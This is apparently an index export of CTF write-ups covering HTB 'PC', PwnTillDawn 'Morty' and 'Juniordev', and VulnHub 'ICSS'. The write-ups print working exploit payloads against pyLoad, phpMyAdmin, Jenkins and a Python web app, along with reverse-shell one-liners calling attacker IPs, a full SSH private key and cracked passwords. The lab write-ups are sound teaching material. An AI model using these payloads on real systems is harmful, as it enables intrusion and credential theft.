state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.Executing: /lib/systemd/systemd-sysv-install enable ssh â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/PC]â””â”€$ sudo systemctl start sshâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/PC]â””â”€$ ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214sau@10.10.11.214s password: Last login: Fri Sep 22 17:01:58 2023 from 10.10.14.151sau@pc:~$```{: .nolineno}Now Lets access that page on 127.0.0.1:8000 and lets try to Nmap it lets see if it is open now or not â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/PC]â””â”€$ sudo nmap -p 8000 127.0.0.1 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-22 23:44 ISTNmap scan report for localhost (127.0.0.1)Host is up (0.000052s latency).PORT STATE SERVICE8000/tcp open http-altNmap done: 1 IP address (1 host up) scanned in 0.16 seconds```{: .nolineno}Since it is open Now so lets see what we got here â†’![Untitled](/Vulnhub-Files/img/PC/Untitled%2010.png)I searched exploit related to pyload and I got this â†’[https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)```bashcurl -i -s -k -X $'POST' \\ --data-binary $'jk=pyimport%20os;os.system(\\\"touch%20/tmp/pwnd\\\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \\ $'http:///flash/addcrypted2'```{: .nolineno}Lets exploit this site with that payload script â†’![Untitled](/Vulnhub-Files/img/PC/Untitled%2011.png)Finally lets run reverse shell to get to root , and for that I need to url encode the script then use it like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/PC]â””â”€$ urlencode \"bash -c 'bash -i >& /dev/tcp/10.10.14.151/4444 0>&1'\"bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.151%2F4444%200%3E%261%27```{: .nolineno}```bashcurl -i -s -k -X $'POST' \\ --data-binary $'jk=pyimport%20os;os.system(\\\"bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.151%2F4444%200%3E%261%27\\\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \\ $'http://127.0.0.1:8000/flash/addcrypted2'```{: .nolineno}![Untitled](/Vulnhub-Files/img/PC/Untitled%2012.png)Lets see the root flag now â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/PC]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.151] from (UNKNOWN) [10.10.11.214] 60142bash: cannot set terminal process group (1047): Inappropriate ioctl for devicebash: no job control in this shellroot@pc:~/.pyload/data# whoamiwhoamirootroot@pc:~/.pyload/data# ididuid=0(root) gid=0(root) groups=0(root)root@pc:~/.pyload/data# ls -alls -altotal 44drwxr-xr-x 2 root root 4096 Sep 22 13:21 .drwxr-xr-x 7 root root 4096 Jan 11 2023 ..-rw-r--r-- 1 root root 1 Jan 11 2023 db.version-rw------- 1 root root 28672 Sep 22 13:21 pyload.dbroot@pc:~/.pyload/data# cd /rootcd /rootroot@pc:~# ls -alls -altotal 68drwx------ 7 root root 4096 Apr 27 15:32 .drwxr-xr-x 21 root root 4096 Apr 27 15:23 ..lrwxrwxrwx 1 root root 9 Jan 11 2023 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Dec 5 2019 .bashrcdrwxr-xr-x 3 root root 4096 Apr 4 10:25 .cachedrwxr-xr-x 3 root root 4096 Apr 4 10:25 .local-rw-r--r-- 1 root root 161 Dec 5 2019 .profiledrwxr-xr-x 7 root root 4096 Jan 11 2023 .pyload-rw------- 1 root root 3203 Apr 27 15:32 .viminfodrwxr-xr-x 3 root root 4096 Apr 27 13:15 Downloads-rw-r----- 1 root root 33 Sep 22 13:22 root.txtdrwx------ 3 root root 4096 Jan 11 2023 snap-rw-r--r-- 1 root root 24576 Jan 11 2023 sqlite.db.bakroot@pc:~# cat root.txt\tcat root.txt7ebed784803fa34de62f3c472840012droot@pc:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Morty", "url": "/posts/Morty/", "categories": "PwnTillDawn", "tags": "Public Exploit, PrivEsc, subdomain", "date": "2023-09-24 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.57]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.57[sudo] password for kali: Starting Nmap 7.94 ( ht...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.57]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.57[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-05 16:22 ISTNmap scan report for 10.150.150.57Host is up (0.19s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 e8:60:09:66:aa:1f:e8:76:d8:84:16:18:1c:e4:ee:32 (RSA)| 256 92:09:d3:0e:f9:47:48:03:9f:32:9f:0f:17:87:c2:a4 (ECDSA)|_ 256 1d:d1:b3:2b:24:dc:c2:8a:d7:ca:44:39:24:c3:af:3d (ED25519)53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux)| dns-nsid: |_ bind.version: 9.16.1-Ubuntu80/tcp open http Apache httpd 2.4.41| http-ls: Volume /| SIZE TIME FILENAME| 147 2020-06-10 11:25 note.html|_|_http-title: Index of /|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸On port 80 I found directory Listing which consist of a file â†’![Untitled](/Vulnhub-Files/img/Morty/Untitled%201.png)![Untitled](/Vulnhub-Files/img/Morty/Untitled%202.png)After setting the `/etc/hosts` file â†’![Untitled](/Vulnhub-Files/img/Morty/Untitled%203.png)Now lets use this Web Page picture password in SSH , but no luck so I used this password in this picture to extract some data and I got it with this Password : `Fl4sk#!` â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.57]â””â”€$ steghide extract -sf screen.jpegEnter passphrase: wrote extracted data to \"keytotheuniverse.txt\". â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.57]â””â”€$ cat keytotheuniverse.txt rick:WubbaLubbaDubDub1!```{: .nolineno}Now again I tried for SSH but no luck , what to do â†’After sometime I looked for subdomain or subdomains and I got this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.57]â””â”€$ dig axfr @10.150.150.57 mortysserver.com ; > DiG 9.18.16-1-Debian > axfr @10.150.150.57 mortysserver.com; (1 server found);; global options: +cmdmortysserver.com.\t900\tIN\tSOA\t10.150.150.57. email.mortysserver.com. 1 900 900 604800 900mortysserver.com.\t900\tIN\tNS\t10.150.150.57.rickscontrolpanel.mortysserver.com. 900\tIN A\t10.150.150.57mortysserver.com.\t900\tIN\tSOA\t10.150.150.57. email.mortysserver.com. 1 900 900 604800 900;; Query time: 187 msec;; SERVER: 10.150.150.57#53(10.150.150.57) (TCP);; WHEN: Sat Aug 05 16:48:59 IST 2023;; XFR size: 4 records (messages 1, bytes 212)```{: .nolineno}Now I have 2 subdomains â†’Lets look at them â†’![Untitled](/Vulnhub-Files/img/Morty/Untitled%204.png)```bashFLAG1=921e4db975bda77543cfe83fbe176d15e09ce7e2```{: .nolineno}Now I used the rick credentials and got logged in and got the 2nd Flag too â†’![Untitled](/Vulnhub-Files/img/Morty/Untitled%205.png)```bashFLAG2=e39c995fbf614c5c38ca7343f59cc310e5880251```{: .nolineno}Now I searched the phpmyAdmin exploit and I got it â†’![Untitled](/Vulnhub-Files/img/Morty/Untitled%206.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.57]â””â”€$ searchsploit phpMyAdmin 4.8.1---------------------------------------------------------------------- Exploit Title | Path----------------------------------------------------------------------phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1) | php/webapps/44924.txtphpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2) | php/webapps/44928.txtphpMyAdmin 4.8.1 - Remote Code Execution (RCE) | php/webapps/50457.py----------------------------------------------------------------------Shellcodes: No Results```{: .nolineno}Now lets use the RCE exploit in this case â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.57]â””â”€$ python 50457.py rickscontrolpanel.mortysserver.com 80 / rick 'WubbaLubbaDubDub1!' whoami www-data```{: .nolineno}Since it is working so lets upload the reverse shell script here â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.57]â””â”€$ python 50457.py rickscontrolpanel.mortysserver.com 80 / rick 'WubbaLubbaDubDub1!' 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.66.67.202 4444 >/tmp/f'```{: .nolineno}In response to that I got this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.57]â””â”€$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.66.67.202] from (UNKNOWN) [10.150.150.57] 40096/bin/sh: 0: cant access tty; job control turned off$ $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@morty:/var/www/html/rickscontrolpanel/public_html/phpmyadmin$ whoamiwhoamiwww-datawww-data@morty:/var/www/html/rickscontrolpanel/public_html/phpmyadmin$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@morty:/var/www/html/rickscontrolpanel/public_html/phpmyadmin$```{: .nolineno}Now I got the last FLAG â†’```bashwww-data@morty:/home/morty$ cat FLAG3.txtcat FLAG3.txt73ce6cecfc1109f1e43d379fd9922dcc699af321www-data@morty:/home/morty$```{: .nolineno}And I do not get to root since it doesnt give anything to get me to root so finish !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Juniordev", "url": "/posts/JuniorDev/", "categories": "PwnTillDawn", "tags": "Jenkins, Password Cracking, Port Forwarding, Python Command Injection", "date": "2023-09-24 00:00:00 +0530", "snippet": "## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.38 [sudo] passwor...", "content": "## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.38 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-03 15:18 ISTNmap scan report for 10.150.150.38Host is up (0.19s latency).Not shown: 65437 closed tcp ports (reset), 82 filtered tcp ports (host-unreach), 14 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 64:63:02:cb:00:44:4a:0f:95:1a:34:8d:4e:60:38:1c (RSA)| 256 0a:6e:10:95:de:3d:6d:4b:98:5f:f0:cf:cb:f5:79:9e (ECDSA)|_ 256 08:04:04:08:51:d2:b4:a4:03:bb:02:71:2f:66:09:69 (ED25519)30609/tcp open http Jetty 9.4.27.v20200227| http-robots.txt: 1 disallowed entry |_/|_http-server-header: Jetty(9.4.27.v20200227)|_http-title: Site doesnt have a title (text/html;charset=utf-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration âž¡ï¸![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%201.png)Now lets brute-force the credentails with username as admin and password I bruteforced it with hydra tool â†’![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%202.png)```bashadmin : matrix```{: .nolineno}![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%203.png)I got logged in as admin so lets exploit now â†’Now I have to get a reverse shell so I followed this site â†’[https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6](https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6)Groovy Script Reverse Shell â†’```bashString host=â€10.66.67.202â€;int port=4444;String cmd=â€/bin/bashâ€;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();```{: .nolineno}![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%204.png)In response to that I got this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.66.67.202] from (UNKNOWN) [10.150.150.38] 60808python3 -c 'import pty;pty.spawn(\"/bin/bash\")'jenkins@dev1:/$ whoamiwhoamijenkinsjenkins@dev1:/$ ididuid=105(jenkins) gid=112(jenkins) groups=112(jenkins)jenkins@dev1:/$ pwdpwd/jenkins@dev1:/$```{: .nolineno}Now I got the shell so lets go deep â†’Got FLAGs on jenkins home directoy inside /users/ directory â†’```bashFLAG69 :dffc1dc67f3d55d2b14227b73b590c4ed09b5113```{: .nolineno}```bashjenkins@dev1:~$ cat FLAG70.txt 41796ff9d0e29c02c961daa93454942d9c6bea7djenkins@dev1:~$```{: .nolineno}Now lets check the .bash_history file here â†’```bashjenkins@dev1:~$ cat .bash_history history exithistory exitcat /home/juniordev/.ssh/id_rsaexitcat .ssh/id_rsacat /home/juniordev/.ssh/id_rsanetstat -natuplcurlcurlps auxps aux | grep rootps aux | grep 8080exitjenkins@dev1:~$ ```{: .nolineno}So I can `cat` the data inside the `id_rsa` file of `juniordev` user , so lets do it â†’```bashjenkins@dev1:~$ cat /home/juniordev/.ssh/id_rsa-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEAutE2eBkhuyABIPkuGJwfsu+rmmcd/f66OU8gwZ8z60ahlcxRTfhpzN4JkbwvqyvXfEqOzUQgTSy+jl19hJsFdaH9eJIRb6Kgj1I24ynDUP+tiXv8CaTix62pf78v/D2ChO0ToG1EzqPsfUG6cNG0FR5Rht8/rqBAQIq6RAHVBg/RKiyRPSW4Z1K3Az5593455UDgAS4/luKMc7Kw0j6THzYG/suDWsbePa7GPAKLNUPvy/sUdpoGmJqCd8nfrpgbxJonv07erSOmn64g25Wac5CwQ3FymrR93HfQ1rqcxAFSXI8vBgx1BKd6uQ8fw1wDmfzq01pL29NyAe8rlC/EXQAAA8i38al7t/GpewAAAAdzc2gtcnNhAAABAQC60TZ4GSG7IAEg+S4YnB+y76uaZx39/ro5TyDBnzPrRqGVzFFN+GnM3gmRvC+rK9d8So7NRCBNLL6OXX2EmwV1of14khFvoqCPUjbjKcNQ/62Je/wJpOLHral/vy/8PYKE7ROgbUTOo+x9Qbpw0bQVHlGG3z+uoEBAirpEAdUGD9EqLJE9JbhnUrcDPnn3fjnlQOABLj+W4oxzsrDSPpMfNgb+y4Naxt49rsY8Aos1Q+/L+xR2mgaYmoJ3yd+umBvEmie/Tt6tI6afriDblZpzkLBDcXKatH3cd9DWupzEAVJcjy8GDHUEp3q5Dx/DXAOZ/OrTWkvb03IB7yuUL8RdAAAAAwEAAQAAAQA5yhgQZK3Thd3zhkFlKX6AyrUJyVY0yQRwT/LxEj9sS2gWv6Jy/SI1VoYdR9pzF9fLwgCUrLtVRD8aKP938sBomBihoIW2Q9dpHmSONtANkVnsSqc3kIL6g9UICGtemuRyHChTGxoK1hiE0r1KwwPy+HL9xrebXEUj8gYWnX55JgnNRnxgHo1ws2YRD0L/+j6jSbf1HstLuhupz6JPGCS6Ev6IVt9w2catEQI1chKx0W/pgXC2E3qxzoGahaFtzBnOlIlp9gUJDF/UKbRwrVB2Dm8amgaIKWng+aWlWsRBLUIt9QvAGnphdH5CLdGb22UQ/3Ke5J1e+zRJ4mqNpZGBAAAAgQCPdYfTvB1Tat+k8ZbCVcXOUFa5KuPJa5iOcHJT90fAJVjLp53LGTCd66QRUB+y30jaVFZQTDPVqdpOCaBq4qdWvQmUX7nrLuH+R1U7gE3rCq0qrhD9OLsQBaHI1yisN/30+OcqQmqKLcjtWEKwPRU0ASLMEkkcFhH18RYd/0y7FAAAAIEA6l21bcwPQe/rN5MxPbmNUtxZzEXe9aJw4SQd4fGIwo73gK3Ppb5zvOhUcCKH5TFGhCwlvTen0VyLJcloGM1H7xXjm1lZdbpsifIONms/nCQgDvOaxTq/4RIAHWuolQblUbaleM3qhsDnq8bBGqZAY0iuccC1RYLpjl8rynAE36EAAACBAMwP4XRz977LV5pAxQraLfy46irxfENlAGttvrSAiE6VoIuaZVJhwUl6iFkS6/rPv2wRKXNi6D9lcC9/yHPpQwv7Hlj/XcPHHpjWxXmxybyNtUjXm/g93802g/4I75ZEe9d97lZSuTQiWcsZZiD5b09+7HZKWtJNIy1nwgxLoJs9AAAADmp1bmlvcmRldkBkZXYxAQIDBA==-----END OPENSSH PRIVATE KEY-----jenkins@dev1:~$```{: .nolineno}Now lets log into `juniordev` user through ssh login with id_rsa file â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]â””â”€$ ssh -i id_rsa juniordev@10.150.150.38 The authenticity of host '10.150.150.38 (10.150.150.38)' cant be established.ED25519 key fingerprint is SHA256:Wt+hABI/6c4jJNCmJR1zAkO8T/S52lAvH7ST/rnQz6o.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.150.150.38' (ED25519) to the list of known hosts.Linux dev1 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Mon Jun 8 22:19:46 2020 from 10.210.210.120juniordev@dev1:~$ whoamijuniordevjuniordev@dev1:~$ iduid=1000(juniordev) gid=1000(juniordev) groups=1000(juniordev),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)juniordev@dev1:~$ ls -altotal 32drwxr-xr-x 5 juniordev juniordev 4096 Jun 15 10:51 .drwxr-xr-x 3 root root 4096 Apr 13 11:09 ..-rw-r--r-- 1 juniordev juniordev 220 Apr 13 11:09 .bash_logout-rw-r--r-- 1 juniordev juniordev 3541 Apr 20 11:48 .bashrcdrwx------ 3 juniordev juniordev 4096 Apr 17 13:02 .gnupgdrwxr-xr-x 3 juniordev juniordev 4096 Apr 17 16:30 .local-rw-r--r-- 1 juniordev juniordev 807 Apr 13 11:09 .profiledrwx-----x 2 juniordev juniordev 4096 Jun 8 16:15 .sshjuniordev@dev1:~$```{: .nolineno}Now I seen the network configuration and I got to know about port 8080 running so for access that I need to perform `port forwarding` â†’```bashjuniordev@dev1:/tmp$ ss -tunlpNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port tcp LISTEN 0 5 127.0.0.1:8080 0.0.0.0:* tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* tcp LISTEN 0 50 *:30609 *:* tcp LISTEN 0 128 [::]:22 [::]:* juniordev@dev1:/tmp$```{: .nolineno}On Attackers Machine I have to reset the ssh ->```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]â””â”€$ sudo systemctl enable ssh Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.Executing: /lib/systemd/systemd-sysv-install enable ssh â”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]â””â”€$ sudo systemctl start ssh```{: .nolineno}On Victim Machine lets connect the Attackers machine to victim machine â†’```bashjuniordev@dev1:/tmp$ ssh kali@10.66.67.202 -R 8080:localhost:8080The authenticity of host '10.66.67.202 (10.66.67.202)' cant be established.ECDSA key fingerprint is SHA256:7OvWn1lnqFObProwjcZQcBd85Tb+nXCUoPJI6Q/us8Q.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '10.66.67.202' (ECDSA) to the list of known hosts.kali@10.66.67.202s password: Linux kali 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64The programs included with the Kali GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$```{: .nolineno}I got this calculator page after loading this `localhost:8080` on web â†’![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%205.png)I refreshed the page and seen the source code â†’![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%206.png)Lets see the flag â†’![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%207.png)```bashFLAG71 : d3c7c338d5d8370e5c61fd68e101237a4d438408```{: .nolineno}while enumerating I also noticed that this service is running as root â†’![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%208.png)Now lets exploit this service through including python command injection exploit on the web server â†’```bash__import__(\"os\").system('rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.66.67.202+2222+>/tmp/f')```{: .nolineno}![Untitled](/Vulnhub-Files/img/JuniorDev/Untitled%209.png)I tried reverse shell and I got it in response â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.38]â””â”€$ nc -lvnp 2222listening on [any] 2222 ...connect to [10.66.67.202] from (UNKNOWN) [10.150.150.38] 56418/bin/sh: 0: cant access tty; job control turned off# python3 -c 'import pty;pty.spawn(\"/bin/bash\")'root@dev1:~/mycalc# whoamiwhoamirootroot@dev1:~/mycalc# ididuid=0(root) gid=0(root) groups=0(root)root@dev1:~/mycalc# cd /rootcd /rootroot@dev1:~# ls -alls -altotal 40drwx------ 7 root root 4096 Jun 15 18:53 .drwxr-xr-x 18 root root 4096 Apr 13 11:06 ..-rw------- 1 root root 0 Apr 20 12:07 .bash_history-rw-r--r-- 1 root root 585 Apr 20 11:47 .bashrcdrwx------ 3 root root 4096 Apr 17 12:32 .cache-r-------- 1 root root 41 Apr 17 16:23 FLAG72.txtdrwx------ 3 root root 4096 Apr 13 13:41 .gnupgdrwxr-xr-x 3 root root 4096 Apr 13 11:23 .localdrwxr-xr-x 5 root root 4096 Jun 15 11:00 mycalc-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwx------ 2 root root 4096 Jun 8 16:13 .sshroot@dev1:~# cat FLAG72.txtcat FLAG72.txtab77beb9cdadc97f3644a00706076293ee8cbbd2root@dev1:~#```{: .nolineno}> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "ICSS CTF", "url": "/posts/ICSS_team_CTF/", "categories": "VulnHub", "tags": "Fuzzing, LFI, SUIDs", "date": "2023-09-24 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/ICSS]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.65 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-19 10:13 I...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/ICSS]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.65 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-19 10:13 ISTNmap scan report for 10.0.2.65Host is up (0.0045s latency).Not shown: 65529 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 7d:e5:cf:49:3d:e0:45:d7:82:db:5d:5b:41:cd:ba:f3 (RSA)| 256 4e:45:8e:17:92:7f:c9:4c:7c:43:2b:ef:41:a0:8e:f5 (ECDSA)|_ 256 3d:d0:f6:d4:f4:98:ce:77:36:ff:c5:30:7c:af:c5:3a (ED25519)25/tcp open smtp Postfix smtpd| ssl-cert: Subject: commonName=ICSSteam| Not valid before: 2023-02-09T15:14:43|_Not valid after: 2033-02-06T15:14:43|_ssl-date: TLS randomness does not represent time|_smtp-commands: ICSSteam, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: ICSS team CTF|_http-server-header: Apache/2.4.18 (Ubuntu)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: DARKXPLOITER)445/tcp open DDtb Samba smbd 4.3.11-Ubuntu (workgroup: DARKXPLOITER)MAC Address: 08:00:27:FA:AB:7B (Oracle VirtualBox virtual NIC)Service Info: Hosts: ICSSteam, 1C$$_T34M; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required| smb2-time: | date: 2023-09-19T04:44:13|_ start_date: N/A|_nbstat: NetBIOS name: 1C$$_T34M, NetBIOS user: , NetBIOS MAC: (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: icssteam| NetBIOS computer name: 1C$$_T34M\\x00| Domain name: \\x00| FQDN: icssteam|_ System time: 2023-09-19T10:14:14+05:30Service detection performed.```{: .nolineno}## Web Enumeartion â¤µï¸Lets check port 80 â†’![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled.png)This file indicates LFI as its URL says so lets try it out â†’![Untitled](/Vulnhub-Files/img/ICSS_team_CTF/Untitled%201.png)I tried with that parameter as page as it was given I was not able to accss the files so I bruteforced the parameter and I got this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/ICSS]â””â”€$ ffuf -c -mc 200,301,302,401 -fc 404,500,401 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://10.0.2.65/index.php?FUZZ=/etc/passwd' -fs 667 -o ffuf_parameter /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ 'v2.0.0-dev________________________________________________ :: Method : GET :: URL : http://10.0.2.65/index.php?FUZZ=/etc/passwd :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt :: Output file : ffuf_parameter :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,301,302,401 :: Filter : Response size: 667 :: Filter : Response status: 404,500,401________________________________________________file [Status: 200, Size: 2389, Words: 218, Lines: 63, Duration: 4ms]:: Progress: [4723/4723] :: Job [1/1] :: 127 req/sec :: Duration: [0:00:05] :: Errors: 0 ::```{: .nolineno}Now I also looked for parameter if possible in `wishlist.php` file and I got hit â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/ICSS]â””â”€$ ffuf -c -mc 200,301,302,401 -fc 404,500,401 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://10.0.2.65/wishlist.php?FUZZ=' -fs 106 -o ffuf_parameter /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ 'v2.0.0-dev________________________________________________ :: Method : GET :: URL : http://10.0.2.65/wishlist.php?FUZZ= :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt :: Output file : ffuf_parameter :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,301,302,401 :: Filter : Response status: 404,500,401 :: Filter : Response size: 106________________________________________________par [Status: 200, Size: 147, Words: 13, Lines: 11, Duration: 6ms]:: Progress: [4723/4723] :: Job 